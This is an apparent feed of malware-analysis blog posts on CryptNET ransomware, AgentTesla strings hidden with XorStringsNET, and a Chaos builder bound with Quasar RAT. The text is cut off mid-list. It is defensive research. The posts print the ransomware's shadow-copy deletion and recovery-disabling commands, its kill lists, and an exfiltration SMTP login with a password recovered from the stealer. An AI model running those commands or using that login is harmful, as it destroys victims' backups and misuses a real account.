            "relUrl": "/in2al5dp3in4er/loader/analysis/sandbox/invalid%20printer/2023/04/23/in2al5dp3in4er.html",
            "date": " ‚Ä¢ Apr 23, 2023"
        }
        
    
  
    
        ,"post9": {
            "title": "CryptNET Ransomware",
            "content": "Overview . This is a new .NET ransomware that was recently documented on Twitter by Zscaler ThreatLabz. This ransomware has a leaks site at http[:]//blog6zw62uijolee7e6aqqnqaszs3ckr5iphzdzsazgrpvtqtjwqryid[.]onion/ and has atleast one victim. . According to Zscaler the ransomware is also protected using .NET Reactor . . Example Ransom Note . *** CRYPTNET RANSOMWARE *** What happened? All of your files are encrypted and stolen. Stolen data will be published soon on our tor website. There is no way to recover your data and prevent data leakage without us Decryption is not possible without private key. Don&#39;t waste your and our time to recover your files. It is impossible without our help How to recover files &amp; prevent leakage? To make sure that we REALLY CAN recover your data - we offer FREE DECRYPTION for warranty. We promise that you can recover all your files safely and prevent data leakage. We can do it! Contact Us Download Tor Browser - https://www.torproject.org/download/ and install it Open website: http://cryptr3fmuv4di5uiczofjuypopr63x2gltlsvhur2ump4ebru2xd3yd.onion Enter DECRYPTION ID: xxxxxxxxxxxxxxxxxxxxxxxxxx . Sample . 2e37320ed43e99835caa1b851e963ebbf153f16cbe395f259bd2200d14c7b775 UnpacMe | . References . NETReactorSlayer thanks washi for the tip : )) | . Analysis . Files are encrypted with AES CBC using a generated 256 bit key and IV. | The generated AES keys are encrypted using a hard coded RSA key and appended to the encrypted files. | . RSA Key . &quot;&lt;RSAKeyValue&gt;&lt;Modulus&gt;8TO8tQQRyFqQ0VShtSpLkDqtDVsrxS8SfdOsqRAj8mWF7sVoGzyZMcv501DF6iZUdKYsFDlaSMnuckG9+MJmD2ldZwU/0H6Xztkta1BkJWSO2qHg2JAGDp9ZsFGP1wDR9oRb1w7wtBe7Db3wf7q848+qKPWiTP/2R/jlR4evW73M65Jdo9uOzQnbmvw+blsloXeszuYlW2nCcwQ7WarzAK29UmM9ZHS0/lqzU0KHNU+DvyfGwmMJgtb2HN6GFGXq9Z0n3dNBCQVzdUl2G/7fLAMoFbJeExn5USZdFHr2ygheTilo/shmfq7tcPCZM8C4zqBtb0Nbct0f/M48+H920Q==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt;&quot; . File Extension Targets . .myd .ndf .qry .sdb .sdf .tmd .tgz .lzo .txt .jar .dat .contact .settings .doc .docx .xls .xlsx .ppt .pptx .odt .jpg .mka .mhtml .oqy .png .csv .py .sql .indd .cs .mp3 .mp4 .dwg .zip .rar .mov .rtf .bmp .mkv .avi .apk .lnk .dib .dic .dif .mdb .php .asp .aspx .html .htm .xml .psd .pdf .xla .cub .dae .divx .iso .7zip .pdb .ico .pas .db .wmv .swf .cer .bak .backup .accdb .bay .p7c .exif .vss .raw .m4a .wma .ace .arj .bz2 .cab .gzip .lzh .tar .jpeg .xz .mpeg .torrent .mpg .core .flv .sie .sum .ibank .wallet .css .js .rb .crt .xlsm .xlsb .7z .cpp .java .jpe .ini .blob .wps .docm .wav .3gp .gif .log .gz .config .vb .m1v .sln .pst .obj .xlam .djvu .inc .cvs .dbf .tbi .wpd .dot .dotx .webm .m4v .amv .m4p .svg .ods .bk .vdi .vmdk .onepkg .accde .jsp .json .xltx .vsdx .uxdc .udl .3ds .3fr .3g2 .accda .accdc .accdw .adp .ai .ai3 .ai4 .ai5 .ai6 .ai7 .ai8 .arw .ascx .asm .asmx .avs .bin .cfm .dbx .dcm .dcr .pict .rgbe .dwt .f4v .exr .kwm .max .mda .mde .mdf .mdw .mht .mpv .msg .myi .nef .odc .geo .swift .odm .odp .oft .orf .pfx .p12 .pl .pls .safe .tab .vbs .xlk .xlm .xlt .xltm .svgz .slk .tar.gz .dmg .ps .psb .tif .rss .key .vob .epsp .dc3 .iff .opt .onetoc2 .nrw .pptm .potx .potm .pot .xlw .xps .xsd .xsf .xsl .kmz .accdr .stm .accdt .ppam .pps .ppsm .1cd .p7b .wdb .sqlite .sqlite3 .db-shm .db-wal .dacpac .zipx .lzma .z .tar.xz .pam .r3d .ova .1c .dt .c .vmx .xhtml .ckp .db3 .dbc .dbs .dbt .dbv .frm .mwb .mrg .txz .mrg .vbox .wmf .wim .xtp2 .xsn .xslt . Services To Kill . BackupExecAgentBrowser veeam VeeamDeploymentSvc PDVFSService BackupExecVSSProvider BackupExecAgentAccelerator vss sql svc$ AcrSch2Svc AcronisAgent Veeam.EndPoint.Service CASAD2DWebSvc CAARCUpdateSvc YooIT memtas sophos veeam DefWatch ccEvtMgr SavRoam RTVscan QBFCService Intuit.QuickBooks.FCS YooBackup BackupExecAgentBrowser BackupExecRPCService MSSQLSERVER backup GxVss GxBlr GxFWD GxCVD GxCIMgr VeeamNFSSvc BackupExecDiveciMediaService SQLBrowser SQLAgent$VEEAMSQL2008R2 SQLAgent$VEEAMSQL2012 VeeamDeploymentService BackupExecJobEngine Veeam.EndPoint.Tray BackupExecManagementService SQLAgent$SQL_2008 BackupExecRPCService zhudongfangyu sophos stc_raw_agent VSNAPVSS QBCFMonitorService VeeamTransportSvc . Processes To Kill . sqlwriter sqbcoreservice VirtualBoxVM sqlagent sqlbrowser sqlservr code steam zoolz agntsvc firefoxconfig infopath synctime VBoxSVC tbirdconfig thebat thebat64 isqlplussvc mydesktopservice mysqld ocssd onenote mspub mydesktopqos CNTAoSMgr Ntrtscan vmplayer oracle outlook powerpnt wps xfssvccon ProcessHacker dbeng50 dbsnmp encsvc excel tmlisten PccNTMon mysqld-nt mysqld-opt ocautoupds ocomm msaccess msftesql thunderbird visio winword wordpad mbamtray . Shadow Copies Destroyed . vssadmin delete shadows /all /quiet &amp; wmic shadowcopy delete bcdedit /set {default} bootstatuspolicy ignoreallfailures &amp; bcdedit /set {default} recoveryenabled no wbadmin delete catalog -quiet . Files Excluded From Encryption . iconcache.db autorun.inf thumbs.db boot.ini bootfont.bin ntuser.ini bootmgr bootmgr.efi bootmgfw.efi desktop.ini ntuser.dat . Directories Excluded From Encryption . windows.old windows.old.old amd nvidia program files program files (x86) windows $recycle.bin documents and settings intel perflogs programdata boot games msocach .",
            "url": "https://research.openanalysis.net/dotnet/cryptnet/ransomware/2023/04/20/cryptnet.html",
            "relUrl": "/dotnet/cryptnet/ransomware/2023/04/20/cryptnet.html",
            "date": " ‚Ä¢ Apr 20, 2023"
        }
        
    
  
    
        ,"post10": {
            "title": "XORStringsNet",
            "content": "Overview . Dr4k0nia published an open source .NET string encryption tool on her github XorStringsNET. This has been picked up and abused by malware developers to encrypt strings in their malware, including families like Redline and AgentTesla. . In response Dr4k0nia released a decryption method and a Yara rule. . https://twitter.com/dr4k0nia/status/1640049711431204872?s=20 . References . XorStringsNET | Encrypting strings in .NET | Unpacking XorStringsNET | Yara: msil_susp_obf_xorstringsnet | . Samples . d56f2852762f7f9fcb07eaf018e143ab1e4ad46e1f2e943faf13618388ef21a2 | . Analysis . There is a bug with the encryption which results in only one byte of the key being used to encrypt the strings. This means we can brute force the strings... or we could take a more measured approach. . Step 1 . First, locate the strings table in memory using the decryption routine, then locating the nested private struct and a field referencing that struct. In the example below the RVA: 0x0001BB7B for the field is the start of the strings table. . // Fields // Token: 0x04000187 RID: 391 RVA: 0x0001BB7B File Offset: 0x00019D7B .field private static valuetype A.u/A bL at I_0001bb7b // 19516 (0x4c3c) bytes . Step 2 . The strings table starts with a 4-byte global key that is used to decrypt the decryption function argument (the pointer to the encrypted string data). Following this key is a serialized stream of the encrypted stings using the following format. . 4 bytes - length little endian 4 bytes - key (only lsb is used) data . import struct def xor_crypt(data, key_byte): out = [] for c in data: out.append(c ^ key_byte) return bytes(out) file_data = open(&#39;/tmp/nettest.bin&#39;, &#39;rb&#39;).read() offset = 0x00019D7B # skip the global enc key offset += 4 ptr = offset strings = [] while True: size = struct.unpack(&#39;&lt;I&#39;, file_data[ptr:ptr+4])[0] if size == 0: break if size &gt; 0x100: break ptr += 4 key = file_data[ptr:ptr+1] ptr += 4 data = file_data[ptr:ptr+size] ptr += size out = xor_crypt(data[::-1], ord(key)) if not out.isascii(): break strings.append(out) . from dnfile import dnPE from dnfile.mdtable import MethodDefRow import dnfile from dnfile.enums import MetadataTables from dncil.cil.body import CilMethodBody from dncil.cil.error import MethodBodyFormatError from dncil.clr.token import Token, StringToken, InvalidToken from dncil.cil.body.reader import CilMethodBodyReaderBase # key token indexes to dotnet meta tables DOTNET_META_TABLES_BY_INDEX = {table.value: table.name for table in MetadataTables} . class_size_list = [] for row in pe.net.mdtables.ClassLayout.rows: type_row = pe.net.mdtables.TypeDef.rows[row.Parent.row_index - 1] if type_row.Flags.tdExplicitLayout: class_size_list.append(row.ClassSize) # Assume the encryption table is the largest class target_class_size = max(class_size_list) target_rva = None # Find the table based on the pysical size for i in range(0,len(pe.net.mdtables.FieldRva.rows) - 1,2): curr_row = pe.net.mdtables.FieldRva.rows[i] next_row = pe.net.mdtables.FieldRva.rows[i +1] if next_row.Rva - curr_row.Rva == target_class_size: target_rva = curr_row.Rva break if target_rva is None: # It must be the last one target_rva = pe.net.mdtables.FieldRva.rows[-1].Rva data = pe.get_data(target_rva, target_class_size) def decrypt_table(data): strings = [] ptr = 0 # Jump past global key ptr += 4 while ptr &lt; len(data): size = struct.unpack(&#39;&lt;I&#39;, data[ptr:ptr+4])[0] if size == 0: break if size &gt; 0x100: break ptr += 4 key = data[ptr:ptr+1] ptr += 4 str_data = data[ptr:ptr+size] ptr += size out = xor_crypt(str_data[::-1], ord(key)) if not out.isascii(): break strings.append(out) return strings decrypt_table(data) . [b&#39;SC&#39;, b&#39;/log.tmp&#39;, b&#39;KL&#39;, b&#39;KL&#39;, b&#39;&lt;br&gt;[&#39;, b&#39;yyyy-MM-dd HH:mm:ss&#39;, b&#39;]&lt;br&gt;&#39;, b&#39;&lt;br&gt;&#39;, b&#39;PW&#39;, b&#39;Time: &#39;, b&#39;MM/dd/yyyy HH:mm:ss&#39;, b&#39;&lt;br&gt;User Name: &#39;, b&#39;&lt;br&gt;Computer Name: &#39;, b&#39;&lt;br&gt;OSFullName: &#39;, b&#39;&lt;br&gt;CPU: &#39;, b&#39;&lt;br&gt;RAM: &#39;, b&#39;&lt;br&gt;&#39;, b&#39;IP Address: &#39;, b&#39;&lt;br&gt;&#39;, b&#39;&lt;hr&gt;&#39;, b&#39;New &#39;, b&#39; Recovered! n nTime: &#39;, b&#39;MM/dd/yyyy HH:mm:ss&#39;, b&#39; nUser Name: &#39;, b&#39;/&#39;, b&#39; nOSFullName: &#39;, b&#39; nCPU: &#39;, b&#39; nRAM: &#39;, b&#39; n&#39;, b&#39;IP Address: &#39;, b&#39; n&#39;, b&#39;_&#39;, b&#39;/&#39;, b&#39;/&#39;, b&#39;false&#39;, b&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#39;, b&#39;false&#39;, b&#39;false&#39;, b&#39;false&#39;, b&#39;false&#39;, b&#39;false&#39;, b&#39;false&#39;, b&#39;20&#39;, b&#39;20&#39;, b&#39;1&#39;, b&#39;false&#39;, b&#39;587&#39;, b&#39;false&#39;, b&#39;mail.expertsconsultgh.co&#39;, b&#39;oppong@expertsconsultgh.co&#39;, b&#39;Oppong.2012&#39;, b&#39;wisdombig57@gmail.com&#39;, b&#39;false&#39;, b&#39;false&#39;, b&#39;appdata&#39;, b&#39;xFzxn&#39;, b&#39;xFzxn.exe&#39;, b&#39;xFzxn&#39;, b&#39;Type&#39;, b&#39;: &#39;, b&#39;: &#39;, b&#39;&lt;br&gt;&#39;, b&#39;&lt;hr&gt;&#39;, b&#39;&lt;br&gt;&#39;, b&#39;&lt;b&gt;[ &#39;, b&#39;]&lt;/b&gt; (&#39;, b&#39;)&lt;br&gt;&#39;, b&#39;{BACK}&#39;, b&#39;{ALT+TAB}&#39;, b&#39;{ALT+F4}&#39;, b&#39;{TAB}&#39;, b&#39;{ESC}&#39;, b&#39;{Win}&#39;, b&#39;{CAPSLOCK}&#39;, b&#39;{KEYUP}&#39;, b&#39;{KEYDOWN}&#39;, b&#39;{KEYLEFT}&#39;, b&#39;{KEYRIGHT}&#39;, b&#39;{DEL}&#39;, b&#39;{END}&#39;, b&#39;{HOME}&#39;, b&#39;{Insert}&#39;, b&#39;{NumLock}&#39;, b&#39;{PageDown}&#39;, b&#39;{PageUp}&#39;, b&#39;{ENTER}&#39;, b&#39;{F1}&#39;, b&#39;{F2}&#39;, b&#39;{F3}&#39;, b&#39;{F4}&#39;, b&#39;{F5}&#39;, b&#39;{F6}&#39;, b&#39;{F7}&#39;, b&#39;{F8}&#39;, b&#39;{F9}&#39;, b&#39;{F10}&#39;, b&#39;{F11}&#39;, b&#39;{F12}&#39;, b&#39; &#39;, b&#39;control&#39;, b&#39;{CTRL}&#39;, b&#39;&amp;&#39;, b&#39;&amp;amp;&#39;, b&#39;&lt;&#39;, b&#39;&amp;lt;&#39;, b&#39;&gt;&#39;, b&#39;&amp;gt;&#39;, b&#39;&#34;&#39;, b&#39;&amp;quot;&#39;, b&#39;&lt;br&gt;&lt;hr&gt;Copied Text: &lt;br&gt;&#39;, b&#39;&lt;hr&gt;&#39;, b&#39;logins&#39;, b&#39;IE/Edge&#39;, b&#39;2F1A6504-0641-44CF-8BB5-3612D865F2E5&#39;, b&#39;Windows Secure Note&#39;, b&#39;3CCD5499-87A8-4B10-A215-608888DD3B55&#39;, b&#39;Windows Web Password Credential&#39;, b&#39;154E23D0-C644-4E6F-8CE6-5069272F999F&#39;, b&#39;Windows Credential Picker Protector&#39;, b&#39;4BF4C442-9B8A-41A0-B380-DD4A704DDB28&#39;, b&#39;Web Credentials&#39;, b&#39;77BC582B-F0A6-4E15-4E80-61736B6F3B29&#39;, b&#39;Windows Credentials&#39;, b&#39;E69D7838-91B5-4FC9-89D5-230D4D4CC2BC&#39;, b&#39;Windows Domain Certificate Credential&#39;, b&#39;3E0E35BE-1B77-43E7-B873-AED901B6275B&#39;, b&#39;Windows Domain Password Credential&#39;, b&#39;3C886FF3-2669-4AA2-A8FB-3F6759A77548&#39;, b&#39;Windows Extended Credential&#39;, b&#39;00000000-0000-0000-0000-000000000000&#39;, b&#39;SchemaId&#39;, b&#39;pResourceElement&#39;, b&#39;pIdentityElement&#39;, b&#39;pPackageSid&#39;, b&#39;pAuthenticatorElement&#39;, b&#39;IE/Edge&#39;, b&#39;UC Browser&#39;, b&#39;UCBrowser &#39;, b&#39;*&#39;, b&#39;Login Data&#39;, b&#39;journal&#39;, b&#39;wow_logins&#39;, b&#39;Safari for Windows&#39;, b&#39; Common Files Apple Apple Application Support plutil.exe&#39;, b&#39; Apple Computer Preferences keychain.plist&#39;, b&#39;&lt;array&gt;&#39;, b&#39;&lt;dict&gt;&#39;, b&#39;&lt;string&gt;&#39;, b&#39;&lt;/string&gt;&#39;, b&#39;&lt;string&gt;&#39;, b&#39;&lt;/string&gt;&#39;, b&#39;&lt;data&gt;&#39;, b&#39;&lt;/data&gt;&#39;, b&#39; -convert xml1 -s -o &#34;&#39;, b&#39; fixed_keychain.xml&#34; &#39;, b&#39;&#34;&#39;, b&#39;&#34;&#39;, b&#39; Microsoft Credentials &#39;, b&#39; Microsoft Credentials &#39;, b&#39; Microsoft Credentials &#39;, b&#39; Microsoft Credentials &#39;, b&#39; Microsoft Protect &#39;, b&#39; &#39;, b&#39;credential&#39;, b&#39;QQ Browser&#39;, b&#39;Tencent QQBrowser User Data&#39;, b&#39; Default EncryptedStorage&#39;, b&#39;Profile&#39;, b&#39; EncryptedStorage&#39;, b&#39;entries&#39;, b&#39;category&#39;, b&#39;Password&#39;, b&#39;str3&#39;, b&#39;str2&#39;, b&#39;blob0&#39;, b&#39;password_value&#39;, b&#39;IncrediMail&#39;, b&#39;PopPassword&#39;, b&#39;SmtpPassword&#39;, b&#39;Software IncrediMail Identities &#39;, b&#39; Accounts_New&#39;, b&#39;PopPassword&#39;, b&#39;SmtpPassword&#39;, b&#39;SmtpServer&#39;, b&#39;EmailAddress&#39;, b&#39;Eudora&#39;, b&#39;Software Qualcomm Eudora CommandLine &#39;, b&#39;current&#39;, b&#39;Settings&#39;, b&#39;SavePasswordText&#39;, b&#39;Settings&#39;, b&#39;ReturnAddress&#39;, b&#39;-&#39;, b&#39;Falkon Browser&#39;, b&#39; falkon profiles &#39;, b&#39;profiles.ini&#39;, b&#39;startProfile=([A-z0-9 / . &#34;]+)&#39;, b&#39;profiles.ini&#39;, b&#39; browsedata.db&#39;, b&#39;autofill&#39;, b&#39;ClawsMail&#39;, b&#39; Claws-mail&#39;, b&#39; clawsrc&#39;, b&#39; clawsrc&#39;, b&#39;passkey0&#39;, b&#39;master_passphrase_salt=(.+)&#39;, b&#39;master_passphrase_pbkdf2_rounds=(.+)&#39;, b&#39; accountrc&#39;, b&#39;smtp_server&#39;, b&#39;address&#39;, b&#39;account&#39;, b&#39;[&#39;, b&#39; &#39;, b&#39;]&#39;, b&#39; passwordstorerc&#39;, b&#39;{(.*),(.*)}(.*)&#39;, b&#39;Flock Browser&#39;, b&#39;APPDATA&#39;, b&#39; Flock Browser &#39;, b&#39;signons3.txt&#39;, b&#39;&#39;, b&#39;.&#39;, b&#39;&#39;, b&#39;DynDns&#39;, b&#39;ALLUSERSPROFILE&#39;, b&#39;Dyn Updater config.dyndns&#39;, b&#39;username=&#39;, b&#39;password=&#39;, b&#39;https://account.dyn.com/&#39;, b&#39;t6KzXhCh&#39;, b&#39;ALLUSERSPROFILE&#39;, b&#39;Dyn Updater daemon.cfg&#39;, b&#39;global&#39;, b&#39;accounts&#39;, b&#39;account.&#39;, b&#39;username&#39;, b&#39;account.&#39;, b&#39;password&#39;, b&#39;Psi/Psi+&#39;, b&#39;name&#39;, b&#39;jid&#39;, b&#39;password&#39;, b&#39;jid&#39;, b&#39;Psi/Psi+&#39;, b&#39;APPDATA&#39;, b&#39; Psi profiles&#39;, b&#39;APPDATA&#39;, b&#39; Psi+ profiles&#39;, b&#39; accounts.xml&#39;, b&#39; accounts.xml&#39;, b&#39;OpenVPN&#39;, b&#39;Software OpenVPN-GUI configs&#39;, b&#39;Software OpenVPN-GUI configs&#39;, b&#39;Software OpenVPN-GUI configs &#39;, b&#39;username&#39;, b&#39;auth-data&#39;, b&#39;entropy&#39;, b&#39;USERPROFILE&#39;, b&#39; OpenVPN config &#39;, b&#39;remote &#39;, b&#39;remote &#39;, b&#39;NordVPN&#39;, b&#39;NordVPN&#39;, b&#39;NordVpn.exe*&#39;, b&#39;user.config&#39;, b&#34;//setting[@name=&#39;Username&#39;]/value&#34;, b&#34;//setting[@name=&#39;Password&#39;]/value&#34;, b&#39;NordVPN&#39;, b&#39;-&#39;, b&#39;Private Internet Access&#39;, b&#39;%ProgramW6432%&#39;, b&#39;Private Internet Access data&#39;, b&#39;ProgramFiles(x86)&#39;, b&#39; Private Internet Access data&#39;, b&#39; account.json&#39;, b&#39;.*&#34;username&#34;:&#34;(.*?)&#34;&#39;, b&#39;.*&#34;password&#34;:&#34;(.*?)&#34;&#39;, b&#39;Private Internet Access&#39;, b&#39;privateinternetaccess.com&#39;, b&#39;FileZilla&#39;, b&#39;APPDATA&#39;, b&#39; FileZilla recentservers.xml&#39;, b&#39;APPDATA&#39;, b&#39; FileZilla recentservers.xml&#39;, b&#39;&lt;Server&gt;&#39;, b&#39;&lt;Host&gt;&#39;, b&#39;&lt;Host&gt;&#39;, b&#39;&lt;/Host&gt;&#39;, b&#39;:&#39;, b&#39;&lt;Port&gt;&#39;, b&#39;&lt;/Port&gt;&#39;, b&#39;&lt;User&gt;&#39;, b&#39;&lt;User&gt;&#39;, b&#39;&lt;/User&gt;&#39;, b&#39;&lt;Pass encoding=&#34;base64&#34;&gt;&#39;, b&#39;&lt;Pass encoding=&#34;base64&#34;&gt;&#39;, b&#39;&lt;/Pass&gt;&#39;, b&#39;&lt;Pass&gt;&#39;, b&#39;&lt;Pass encoding=&#34;base64&#34;&gt;&#39;, b&#39;&lt;/Pass&gt;&#39;, b&#39;CoreFTP&#39;, b&#39;SOFTWARE FTPWare COREFTP Sites&#39;, b&#39; &#39;, b&#39;PW&#39;, b&#39;User&#39;, b&#39;Host&#39;, b&#39;Port&#39;, b&#39;hdfzpysvpzimorhk&#39;, b&#39;WinSCP&#39;, b&#39;SOFTWARE Martin Prikryl WinSCP 2 Sessions&#39;, b&#39;HostName&#39;, b&#39;UserName&#39;, b&#39;Password&#39;, b&#39;PublicKeyFile&#39;, b&#39;:&#39;, b&#39;PortNumber&#39;, b&#39;22&#39;, b&#39;[PRIVATE KEY LOCATION: &#34;{0}&#34;]&#39;, b&#39;WinSCP&#39;, b&#39;A&#39;, b&#39;10&#39;, b&#39;B&#39;, b&#39;11&#39;, b&#39;C&#39;, b&#39;12&#39;, b&#39;D&#39;, b&#39;13&#39;, b&#39;E&#39;, b&#39;14&#39;, b&#39;F&#39;, b&#39;15&#39;, b&#39;ABCDEF&#39;, b&#39;Flash FXP&#39;, b&#39;IP&#39;, b&#39;:&#39;, b&#39;port&#39;, b&#39;user&#39;, b&#39;pass&#39;, b&#39;quick.dat&#39;, b&#39;Sites.dat&#39;, b&#39; FlashFXP &#39;, b&#39; FlashFXP &#39;, b&#39; &#39;, b&#39; &#39;, b&#39; &#39;, b&#39; &#39;, b&#39; &#39;, b&#39;yA36zA48dEhfrvghGRg57h5UlDv3&#39;, b&#39;FTP Navigator&#39;, b&#39;SystemDrive&#39;, b&#39; FTP Navigator Ftplist.txt&#39;, b&#39;Server&#39;, b&#39;Password&#39;, b&#39;No Password&#39;, b&#39;User&#39;, b&#39;SmartFTP&#39;, b&#39;APPDATA&#39;, b&#39;SmartFTP Client 2.0 Favorites Quick Connect&#39;, b&#39;WS_FTP&#39;, b&#39;appdata&#39;, b&#39;Ipswitch WS_FTP Sites ws_ftp.ini&#39;, b&#39;HOST&#39;, b&#39;UID&#39;, b&#39;PWD&#39;, b&#39;PWD=&#39;, b&#39;PWD=&#39;, b&#39;FtpCommander&#39;, b&#39;SystemDrive&#39;, b&#39; Program Files (x86) FTP Commander Deluxe Ftplist.txt&#39;, b&#39;SystemDrive&#39;, b&#39; Program Files (x86) FTP Commander Ftplist.txt&#39;, b&#39;SystemDrive&#39;, b&#39; cftp Ftplist.txt&#39;, b&#39; VirtualStore Program Files (x86) FTP Commander Ftplist.txt&#39;, b&#39; VirtualStore Program Files (x86) FTP Commander Deluxe Ftplist.txt&#39;, b&#39;;Password=&#39;, b&#39;;User=&#39;, b&#39;;Server=&#39;, b&#39;;Port=&#39;, b&#39;;Port=&#39;, b&#39;;Password=&#39;, b&#39;;User=&#39;, b&#39;;Anonymous=&#39;, b&#39;:&#39;, b&#39;FTPGetter&#39;, b&#39; FTPGetter servers.xml&#39;, b&#39;&lt;server&gt;&#39;, b&#39;&lt;server_ip&gt;&#39;, b&#39;&lt;server_ip&gt;&#39;, b&#39;&lt;/server_ip&gt;&#39;, b&#39;:&#39;, b&#39;&lt;server_port&gt;&#39;, b&#39;&lt;/server_port&gt;&#39;, b&#39;&lt;server_user_name&gt;&#39;, b&#39;&lt;server_user_name&gt;&#39;, b&#39;&lt;/server_user_name&gt;&#39;, b&#39;&lt;server_user_password&gt;&#39;, b&#39;&lt;server_user_password&gt;&#39;, b&#39;&lt;/server_user_password&gt;&#39;, b&#39;FTPGetter&#39;, b&#39;The Bat!&#39;, b&#39;appdata&#39;, b&#39; The Bat!&#39;, b&#39; Account.CFN&#39;, b&#39; Account.CFN&#39;, b&#39;zzz&#39;, b&#39;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=&#39;, b&#39;+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;, b&#39;Becky!&#39;, b&#39;HKEY_CURRENT_USER Software RimArts B2 Settings&#39;, b&#39;DataDir&#39;, b&#39;Folder.lst&#39;, b&#39; Mailbox.ini&#39;, b&#39;Account&#39;, b&#39;PassWd&#39;, b&#39;Account&#39;, b&#39;SMTPServer&#39;, b&#39;Account&#39;, b&#39;MailAddress&#39;, b&#39;Becky!&#39;, b&#39;Outlook&#39;, b&#39;Software Microsoft Office 15.0 Outlook Profiles Outlook 9375CFF0413111d3B88A00104B2A6676&#39;, b&#39;Software Microsoft Windows NT CurrentVersion Windows Messaging Subsystem Profiles Outlook 9375CFF0413111d3B88A00104B2A6676&#39;, b&#39;Software Microsoft Windows Messaging Subsystem Profiles 9375CFF0413111d3B88A00104B2A6676&#39;, b&#39;Software Microsoft Office 16.0 Outlook Profiles Outlook 9375CFF0413111d3B88A00104B2A6676&#39;, b&#39;Email&#39;, b&#39;IMAP Password&#39;, b&#39;POP3 Password&#39;, b&#39;HTTP Password&#39;, b&#39;SMTP Password&#39;, b&#39;Email&#39;, b&#39;Email&#39;, b&#39;Email&#39;, b&#39;IMAP Password&#39;, b&#39;POP3 Password&#39;, b&#39;HTTP Password&#39;, b&#39;SMTP Password&#39;, b&#39; Server&#39;, b&#39;Windows Mail App&#39;, b&#39;COMPlus_legacyCorruptedStateExceptionsPolicy&#39;, b&#39;1&#39;, b&#39;Software Microsoft ActiveSync Partners&#39;, b&#39;Email&#39;, b&#39;Server&#39;, b&#39;SchemaId&#39;, b&#39;pResourceElement&#39;, b&#39;pIdentityElement&#39;, b&#39;pPackageSid&#39;, b&#39;pAuthenticatorElement&#39;, b&#39;syncpassword&#39;, b&#39;mailoutgoing&#39;, b&#39;FoxMail&#39;, b&#39;HKEY_CURRENT_USER Software Aerofox FoxmailPreview&#39;, b&#39;Executable&#39;, b&#39;HKEY_CURRENT_USER Software Aerofox Foxmail V3.1&#39;, b&#39;FoxmailPath&#39;, b&#39; Storage &#39;, b&#39; Storage &#39;, b&#39; mail&#39;, b&#39; mail&#39;, b&#39; VirtualStore Program Files Foxmail mail&#39;, b&#39; VirtualStore Program Files Foxmail mail&#39;, b&#39; VirtualStore Program Files (x86) Foxmail mail&#39;, b&#39; VirtualStore Program Files (x86) Foxmail mail&#39;, b&#39; Accounts Account.rec0&#39;, b&#39; Accounts Account.rec0&#39;, b&#39; Account.stg&#39;, b&#39; Account.stg&#39;, b&#39;POP3Host&#39;, b&#39;SMTPHost&#39;, b&#39;IncomingServer&#39;, b&#39;Account&#39;, b&#39;MailAddress&#39;, b&#39;Password&#39;, b&#39;POP3Password&#39;, b&#39;5A&#39;, b&#39;71&#39;, b&#39;Opera Mail&#39;, b&#39; Opera Mail Opera Mail wand.dat&#39;, b&#39; Opera Mail Opera Mail wand.dat&#39;, b&#39;opera:&#39;] .",
            "url": "https://research.openanalysis.net/dotnet/xorstringsnet/agenttesla/2023/04/16/xorstringsnet.html",
            "relUrl": "/dotnet/xorstringsnet/agenttesla/2023/04/16/xorstringsnet.html",
            "date": " ‚Ä¢ Apr 16, 2023"
        }
        
    
  
    
        ,"post11": {
            "title": "Quasar Chaos",
            "content": ". Overview . This sample appears to be a Chaos Ransomware builder but it is actually bound with Quasar RAT!! . Binder: Celesty Binder | PDB path: C: Users DarkCoderSc Desktop Celesty Binder Stub STATIC Stub.pdb | Chaos Ransomware malpedia | . Samples . 141056b82cd0a20495822cd2bcd5fae5c989c6d24dac5a5e3c3916f1b406bdb9 UnpacMe | . Chaos Builder . Chaos Ransomware builder is an open source project that can be found on GitHub ChaosRansomwareBuilderVersion4. It appears that this project was compiled then the Celesty Binder was used to bind the ransomware builder with Quasar RAT. Both the builder and the RAT can be found in the resources section of the binder exe. . The extracted builder is a clean build and will work on its own f2665f89ba53abd3deb81988c0d5194992214053e77fc89b98b64a31a7504d77 . Quasar RAT . Quasar is ostensibly a &quot;remote administration tool&quot; (RAT) that is open source and available on GitHub Quasar. Looking through the source this appears to be developed for the purpose of unauthorized remote access to victims and includes a configuration that could turn this into a malicious RAT. . The extracted RAT d8b36742b4c5cf9ce5ce58ac859c4162fb127298dfd3f15fa4f101c0cb878bda . Analysis . The strings in the RAT (config) are encrypted using Base64 and AES CBC. . import base64 import malduck from Crypto.Protocol.KDF import PBKDF2 string_data = &#39;muoBJw7vz107HYcI4tyRBz0XVW2kCA367J52yCDjuHUkVGWPKkpXUgV5Q1/s4HNhSAMJDhTJwYIa3MxqdMkg7A==&#39; string_data_b64 = base64.b64decode(string_data) string_data_b64 = string_data_b64[32:] iv = string_data_b64[:16] enc_data = string_data_b64[16:] key_data = &quot;SM73jcn259KtoJ4uPciZ&quot; iterations = 50000 salt = bytes([191,235,30,86,251,205,151,59,178,25,2,36,48,165,120,67,0,61,86,68,210,30,98,185,212,241,128,231,230,195,57,65]) key = PBKDF2(key_data, salt, count=iterations) strings = [ &quot;3DaXS6MYqYL9Q/3WF/cPdbdoy2NggCqoSmasPYwzkPD389j4IoSZZVQHHz196cPEy2h4VSsjy7se22/++XH89w==&quot;, &quot;U2MkYAPUljFBQRO9iIkRZVGmxS2mOB+3klWr1xcKn3OqiosSod4C8iKk+GmogWRVZ6xUFktvHtwFnyOxg+ZSLPjbO+3+OdrVI8o+NK7UCZA=&quot;, &quot;1WvgEMPjdwfqIMeM9MclyQ==&quot;, &quot;NcFtjbDOcsw7Evd3coMC0y4koy/SRZGydhNmno81ZOWOvdfg7sv0Cj5ad2ROUfX4QMscAIjYJdjrrs41+qcQwg==&quot;, &quot;NX2L76Nud+1o8CF2fRs8qiHu4v2wb0E701jiqZNY+WP0X+oOZUuIpza8zsipPF550Uz4XlYTbeon9njxoQ2MBA==&quot;, &quot;DQSIoMapurAvRyZWC74v/c0E7zcV+8LgDPpOmChR453N+Cj+6Fwipe5tbYPbhkpNhwf9hEy/78hh8qB6c1B3nw==&quot;, 